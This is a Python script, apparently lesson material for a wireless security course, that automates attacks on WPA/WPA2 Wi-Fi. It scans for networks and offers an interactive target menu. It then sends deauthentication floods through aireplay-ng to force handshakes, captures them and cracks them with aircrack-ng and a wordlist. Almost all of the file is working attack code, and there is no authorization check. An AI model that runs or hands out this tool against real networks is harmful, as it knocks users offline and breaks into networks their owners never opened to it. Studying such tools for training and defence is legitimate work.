#!/usr/bin/env python3
"""
Script Name: wifi_cracker.py
Lesson: 07 - Wireless & Bluetooth Security
Similar to: airodump-ng, aircrack-ng, wifite
Description: Automated WiFi handshake capture and password cracking

Usage:
    python3 wifi_cracker.py --interface wlan0mon --scan
    python3 wifi_cracker.py --interface wlan0mon --target "TargetNetwork" --wordlist rockyou.txt
    python3 wifi_cracker.py --handshake capture.cap --wordlist passwords.txt

Educational Notes:
    - Demonstrates 802.11 frame analysis
    - Shows handshake capture techniques
    - Teaches WPA/WPA2 password cracking
"""

import argparse
import subprocess
import re
import time
import os
import signal
import threading
from datetime import datetime
import hashlib

class WiFiCracker:
    def __init__(self, interface):
        self.interface = interface
        self.networks = []
        self.handshake_captured = False
        self.running_processes = []
        
    def check_interface(self):
        """Check if interface is in monitor mode"""
        try:
            result = subprocess.run(['iwconfig', self.interface], 
                                  capture_output=True, text=True)
            if 'Mode:Monitor' in result.stdout:
                print(f"[+] Interface {self.interface} is in monitor mode")
                return True
            else:
                print(f"[!] Interface {self.interface} is not in monitor mode")
                print("[*] Try: airmon-ng start wlan0")
                return False
        except:
            print(f"[!] Interface {self.interface} not found")
            return False
    
    def scan_networks(self, duration=30):
        """Scan for wireless networks"""
        print(f"[*] Scanning for wireless networks for {duration} seconds...")
        
        # Create temporary files for airodump-ng
        scan_file = f"/tmp/wifi_scan_{int(time.time())}"
        
        # Start airodump-ng
        cmd = ['airodump-ng', '-w', scan_file, '--output-format', 'csv', self.interface]
        
        try:
            proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            self.running_processes.append(proc)
            
            time.sleep(duration)
            
            # Stop airodump-ng
            proc.terminate()
            proc.wait()
            
            # Parse results
            self.parse_scan_results(f"{scan_file}-01.csv")
            
            # Cleanup
            for ext in ['-01.csv', '-01.kismet.csv', '-01.kismet.netxml']:
                try:
                    os.remove(f"{scan_file}{ext}")
                except:
                    pass
                    
        except Exception as e:
            print(f"[!] Error during scanning: {e}")
    
    def parse_scan_results(self, csv_file):
        """Parse airodump-ng CSV results"""
        try:
            with open(csv_file, 'r') as f:
                content = f.read()
            
            # Parse networks section
            lines = content.split('\n')
            in_networks = False
            
            for line in lines:
                if 'BSSID' in line and 'ESSID' in line:
                    in_networks = True
                    continue
                elif line.strip() == '' and in_networks:
                    break
                elif in_networks and line.strip():
                    parts = [p.strip() for p in line.split(',')]
                    if len(parts) >= 14:
                        bssid = parts[0]
                        channel = parts[3]
                        encryption = parts[5]
                        power = parts[8]
                        essid = parts[13]
                        
                        if essid and 'WPA' in encryption:
                            self.networks.append({
                                'bssid': bssid,
                                'essid': essid,
                                'channel': channel,
                                'encryption': encryption,
                                'power': power
                            })
            
            # Display results
            if self.networks:
                print(f"\n[+] Found {len(self.networks)} WPA/WPA2 networks:")
                print(f"{'#':<3} {'ESSID':<20} {'BSSID':<18} {'CH':<3} {'PWR':<4} {'ENC'}")
                print("-" * 70)
                for i, net in enumerate(self.networks, 1):
                    print(f"{i:<3} {net['essid'][:19]:<20} {net['bssid']:<18} "
                          f"{net['channel']:<3} {net['power']:<4} {net['encryption']}")
            else:
                print("[-] No WPA/WPA2 networks found")
                
        except Exception as e:
            print(f"[!] Error parsing scan results: {e}")
    
    def capture_handshake(self, target_bssid, target_essid, channel, timeout=300):
        """Capture WPA handshake"""
        print(f"[*] Capturing handshake for {target_essid} ({target_bssid})")
        print(f"[*] Channel: {channel}, Timeout: {timeout} seconds")
        
        capture_file = f"/tmp/handshake_{target_essid.replace(' ', '_')}_{int(time.time())}"
        
        # Start monitoring specific network
        monitor_cmd = ['airodump-ng', '-c', channel, '--bssid', target_bssid, 
                      '-w', capture_file, self.interface]
        
        try:
            monitor_proc = subprocess.Popen(monitor_cmd, stdout=subprocess.DEVNULL, 
                                          stderr=subprocess.DEVNULL)
            self.running_processes.append(monitor_proc)
            
            print("[*] Monitoring for handshake...")
            time.sleep(5)  # Wait for monitoring to start
            
            # Perform deauth attack to force handshake
            print("[*] Sending deauthentication packets...")
            deauth_cmd = ['aireplay-ng', '-0', '5', '-a', target_bssid, self.interface]
            
            for attempt in range(3):
                print(f"[*] Deauth attempt {attempt + 1}/3")
                subprocess.run(deauth_cmd, stdout=subprocess.DEVNULL, 
                             stderr=subprocess.DEVNULL)
                time.sleep(10)
                
                # Check for handshake
                if self.check_handshake(f"{capture_file}-01.cap"):
                    print("[+] Handshake captured successfully!")
                    self.handshake_captured = True
                    break
            
            monitor_proc.terminate()
            monitor_proc.wait()
            
            if self.handshake_captured:
                return f"{capture_file}-01.cap"
            else:
                print("[-] Failed to capture handshake")
                return None
                
        except Exception as e:
            print(f"[!] Error during handshake capture: {e}")
            return None
    
    def check_handshake(self, cap_file):
        """Check if handshake is present in capture file"""
        try:
            if not os.path.exists(cap_file):
                return False
            
            # Use aircrack-ng to check for handshake
            cmd = ['aircrack-ng', cap_file]
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            return "1 handshake" in result.stdout.lower()
        except:
            return False
    
    def crack_handshake(self, cap_file, wordlist):
        """Crack WPA handshake using wordlist"""
        print(f"[*] Starting password crack on {cap_file}")
        print(f"[*] Wordlist: {wordlist}")
        
        if not os.path.exists(wordlist):
            print(f"[!] Wordlist not found: {wordlist}")
            return None
        
        try:
            # Count passwords in wordlist
            with open(wordlist, 'r', encoding='utf-8', errors='ignore') as f:
                password_count = sum(1 for _ in f)
            
            print(f"[*] Wordlist contains {password_count:,} passwords")
            
            # Start aircrack-ng
            cmd = ['aircrack-ng', '-w', wordlist, cap_file]
            
            print("[*] Starting aircrack-ng...")
            start_time = time.time()
            
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, 
                                     stderr=subprocess.PIPE, text=True)
            
            # Monitor progress
            while process.poll() is None:
                time.sleep(1)
                elapsed = time.time() - start_time
                print(f"\r[*] Cracking... Elapsed: {elapsed:.0f}s", end='')
            
            stdout, stderr = process.communicate()
            
            # Check if password was found
            if "KEY FOUND!" in stdout:
                # Extract password
                lines = stdout.split('\n')
                for line in lines:
                    if "KEY FOUND!" in line:
                        password = line.split('[')[1].split(']')[0].strip()
                        elapsed = time.time() - start_time
                        print(f"\n[+] PASSWORD FOUND: {password}")
                        print(f"[+] Time taken: {elapsed:.2f} seconds")
                        return password
            else:
                print(f"\n[-] Password not found in wordlist")
                print(f"[-] Tried {password_count:,} passwords")
                return None
                
        except Exception as e:
            print(f"[!] Error during password cracking: {e}")
            return None
    
    def generate_handshake_report(self, target_essid, target_bssid, cap_file, password=None):
        """Generate handshake analysis report"""
        print("\n" + "="*60)
        print("HANDSHAKE ANALYSIS REPORT")
        print("="*60)
        
        print(f"Target Network: {target_essid}")
        print(f"BSSID: {target_bssid}")
        print(f"Capture File: {cap_file}")
        print(f"Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        
        if password:
            print(f"🔑 Password: {password}")
            print(f"🔑 Password Length: {len(password)} characters")
            print(f"🔑 Password Hash (MD5): {hashlib.md5(password.encode()).hexdigest()}")
        else:
            print("❌ Password: Not cracked")
        
        # Analyze capture file
        if os.path.exists(cap_file):
            file_size = os.path.getsize(cap_file)
            print(f"📄 Capture file size: {file_size:,} bytes")
            
            # Use aircrack-ng to get more info
            try:
                cmd = ['aircrack-ng', cap_file]
                result = subprocess.run(cmd, capture_output=True, text=True)
                
                if "handshake" in result.stdout.lower():
                    print("✅ Valid handshake confirmed")
                else:
                    print("❌ No valid handshake found")
            except:
                pass
    
    def cleanup(self):
        """Clean up running processes"""
        for proc in self.running_processes:
            try:
                proc.terminate()
                proc.wait(timeout=5)
            except:
                try:
                    proc.kill()
                except:
                    pass
    
    def signal_handler(self, signum, frame):
        """Handle Ctrl+C gracefully"""
        print("\n[!] Interrupted by user")
        self.cleanup()
        exit(0)

def create_sample_wordlist():
    """Create a small sample wordlist for testing"""
    wordlist_path = "/tmp/sample_passwords.txt"
    
    passwords = [
        "password", "123456", "password123", "admin", "qwerty",
        "letmein", "welcome", "monkey", "dragon", "master",
        "shadow", "azerty", "654321", "superman", "batman"
    ]
    
    with open(wordlist_path, 'w') as f:
        for password in passwords:
            f.write(password + '\n')
    
    print(f"[*] Created sample wordlist: {wordlist_path}")
    return wordlist_path

def main():
    parser = argparse.ArgumentParser(description="WiFi handshake capture and cracking tool")
    parser.add_argument('--interface', required=True, help='Monitor mode interface (e.g., wlan0mon)')
    parser.add_argument('--scan', action='store_true', help='Scan for WiFi networks')
    parser.add_argument('--target', help='Target network ESSID')
    parser.add_argument('--bssid', help='Target network BSSID (optional)')
    parser.add_argument('--channel', help='Target network channel (optional)')
    parser.add_argument('--handshake', help='Existing handshake file to crack')
    parser.add_argument('--wordlist', help='Password wordlist file')
    parser.add_argument('--timeout', type=int, default=300, 
                       help='Handshake capture timeout (seconds)')
    parser.add_argument('--scan-time', type=int, default=30,
                       help='Network scan duration (seconds)')
    
    args = parser.parse_args()
    
    cracker = WiFiCracker(args.interface)
    
    # Set up signal handler
    signal.signal(signal.SIGINT, cracker.signal_handler)
    
    try:
        # Check if we're just cracking an existing handshake
        if args.handshake and args.wordlist:
            if os.path.exists(args.handshake):
                print(f"[*] Cracking existing handshake: {args.handshake}")
                password = cracker.crack_handshake(args.handshake, args.wordlist)
                cracker.generate_handshake_report("Unknown", "Unknown", args.handshake, password)
            else:
                print(f"[!] Handshake file not found: {args.handshake}")
            return 0
        
        # Check interface
        if not cracker.check_interface():
            return 1
        
        # Scan for networks
        if args.scan or not args.target:
            cracker.scan_networks(args.scan_time)
            
            if not args.target and cracker.networks:
                print(f"\n[*] Select a target network:")
                for i, net in enumerate(cracker.networks, 1):
                    print(f"{i}. {net['essid']} ({net['bssid']})")
                
                try:
                    choice = int(input("[*] Enter selection: ")) - 1
                    if 0 <= choice < len(cracker.networks):
                        target_net = cracker.networks[choice]
                        args.target = target_net['essid']
                        args.bssid = target_net['bssid']
                        args.channel = target_net['channel']
                    else:
                        print("[!] Invalid selection")
                        return 1
                except:
                    print("[!] Invalid input")
                    return 1
        
        if not args.target:
            print("[!] No target specified")
            return 1
        
        # Find target network if not specified
        if not args.bssid or not args.channel:
            target_found = False
            for net in cracker.networks:
                if net['essid'] == args.target:
                    args.bssid = net['bssid']
                    args.channel = net['channel']
                    target_found = True
                    break
            
            if not target_found:
                print(f"[!] Target network '{args.target}' not found")
                print("[*] Try running with --scan first")
                return 1
        
        # Capture handshake
        print(f"\n[*] Targeting: {args.target}")
        cap_file = cracker.capture_handshake(args.bssid, args.target, args.channel, args.timeout)
        
        if cap_file and cracker.handshake_captured:
            # Create wordlist if none provided
            if not args.wordlist:
                args.wordlist = create_sample_wordlist()
                print("[*] No wordlist provided, using sample wordlist")
            
            # Crack the handshake
            password = cracker.crack_handshake(cap_file, args.wordlist)
            cracker.generate_handshake_report(args.target, args.bssid, cap_file, password)
        else:
            print("[-] Failed to capture handshake")
            return 1
        
    except KeyboardInterrupt:
        cracker.signal_handler(signal.SIGINT, None)
    except Exception as e:
        print(f"[!] Error: {e}")
        cracker.cleanup()
        return 1
    
    finally:
        cracker.cleanup()

if __name__ == "__main__":
    exit(main())